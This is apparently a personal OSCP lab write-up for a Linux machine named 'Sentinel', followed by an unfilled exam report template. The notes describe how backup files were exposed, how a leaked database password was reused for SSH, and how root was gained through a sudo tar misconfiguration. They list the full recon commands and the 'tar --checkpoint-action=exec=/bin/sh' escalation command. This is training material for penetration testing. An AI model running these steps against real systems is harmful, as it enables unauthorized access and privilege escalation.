# Sentinel — OSCP

> **Machine Name:** Sentinel · **Operating System:** Linux (Ubuntu 20.04) · **Difficulty:** Medium · **Platform:** OSCP · **IP:** `10.10.11.42`
> **Status:** Reported · **User flag:** ✅ Captured 14.03.2026 · **Root flag:** ✅ Captured 14.03.2026

## Services

| Port | Proto | State | Service | Version |
|---|---|---|---|---|
| 22 | tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |
| 80 | tcp | open | http | Apache httpd 2.4.41 ((Ubuntu)) |
| 3306 | tcp | filtered | mysql |  |

## Credentials

| User | Secret | Type | Source | Works on | State |
|---|---|---|---|---|---|
| svc_web | `Str0ngDBPass!2024` | password | /backup/site-config.php.bak | mysql, ssh | ✅ |
| admin | `admin` | password | portal login form — guessed | nothing | ❌ |
| root | `(no password — sudo tar)` | other | sudo -l misconfiguration | local root | ✅ |

## Attack Path

```
10.10.11.42:80  Apache 2.4.41
  └─ /backup/ directory listing left enabled
       └─ site-config.php.bak  ->  db creds  (svc_web : Str0ngDBPass!2024)
            └─ password reused for SSH  ->  shell as svc_web
                 └─ sudo -l  ->  (ALL) NOPASSWD: /usr/bin/tar
                      └─ tar --checkpoint-action=exec  ->  root
```

## Progress

### Checklist (11/11)

- [x] Initial Nmap Scan
- [x] Service Enumeration
- [x] Web Application Testing
- [x] Vulnerability Identified
- [x] Exploit Found
- [x] Initial Foothold
- [x] User Flag / local.txt
- [x] Privilege Escalation
- [x] Root Flag / proof.txt
- [x] Screenshots Taken
- [x] Documentation Complete

## Notes

The portal login is a dead end: it rate-limits after 5 tries and the only
account that exists is `admin`, which is not the way in. The way in is that
`/backup/` was left indexable — the editor backup of site-config.php is served
as plain text because Apache does not hand .bak to PHP.

Password reuse did the rest. The database password was also the SSH password
for the same service account, which is the single most common finding in this
kind of box and the one worth writing up properly in the recommendations.

## Activity Timeline

- `nmap -sCV -p- --min-rate 2000 -oA sentinel 10.10.11.42`  
  _14.03.2026 12:15:00_
- **14.03.2026 12:33:00** — 22/80 open, 3306 filtered. Apache 2.4.41, no obvious CVE — this is a content problem, not a version problem.
- `feroxbuster -u http://10.10.11.42 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak,txt`  
  _14.03.2026 12:42:00_
- **14.03.2026 13:06:00** — /backup/ returns a directory listing. site-config.php.bak is served as text/plain.
- `curl -s http://10.10.11.42/backup/site-config.php.bak`  
  _14.03.2026 13:18:00_
- **14.03.2026 13:30:00** — DB creds in the clear: svc_web / Str0ngDBPass!2024
- `ssh svc_web@10.10.11.42`  
  _14.03.2026 13:54:00_
- **14.03.2026 14:24:00** — Password reuse — shell as svc_web. local.txt captured.
- `sudo -l`  
  _14.03.2026 14:36:00_
- **14.03.2026 14:48:00** — (ALL) NOPASSWD: /usr/bin/tar — GTFOBins has this one.
- `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`  
  _14.03.2026 15:30:00_
- **14.03.2026 15:54:00** — Root shell. proof.txt captured. Screenshots taken with the whoami/hostname/ip banner in frame.

---

# Sentinel — Report

## Administrative Information

- **Author / Candidate:**
- **OSID:**
- **Date:**
- **Assessment:** OSCP Exam / Lab
- **In-scope targets:** `10.10.11.42`

## High-Level Summary

One-paragraph narrative of which hosts were compromised and the overall path to
each foothold and privilege escalation. State the total points claimed.

### Compromised Hosts

| Host | IP | Highest Access | local.txt | proof.txt | Points |
| --- | --- | --- | --- | --- | --- |
| target01 | `10.10.11.42` | root / SYSTEM | ✓ | ✓ | 20 |

## Methodology

Recon → enumeration → exploitation → post-exploitation, repeated per target. All
exploitation was performed manually except where a single well-known public
exploit was permitted per exam rules.

---

## Target: `10.10.11.42`

### Service Enumeration

```
nmap -p- --min-rate 5000 -oA nmap/all 10.10.11.42
nmap -sC -sV -p<PORT> -oA nmap/svc 10.10.11.42
```

| Port | Service | Version |
| --- | --- | --- |
|  |  |  |

### Vulnerability

- **Name:**
- **CVE / Reference:**
- **Description:**

### Exploitation — Steps to Reproduce

1.
2.
3.

```
# exploit / payload
```

### Proof (local.txt)

```
whoami && hostname && ip a   # or: ipconfig /all
type C:\Users\<USER>\Desktop\local.txt   # or: cat /home/<USER>/local.txt
```

### Privilege Escalation

- **Vector:**

1.
2.

```
# priv-esc steps
```

### Proof (proof.txt)

```
whoami   # NT AUTHORITY\SYSTEM or root
type C:\Users\Administrator\Desktop\proof.txt   # or: cat /root/proof.txt
```

## Maintaining Access

Persistence used (only if explicitly in scope).

## House Cleaning

- [ ] Removed uploaded tools / payloads
- [ ] Reverted configuration changes
- [ ] Removed any created accounts / scheduled tasks

## Appendices

### Appendix A — Commands Used

```
```
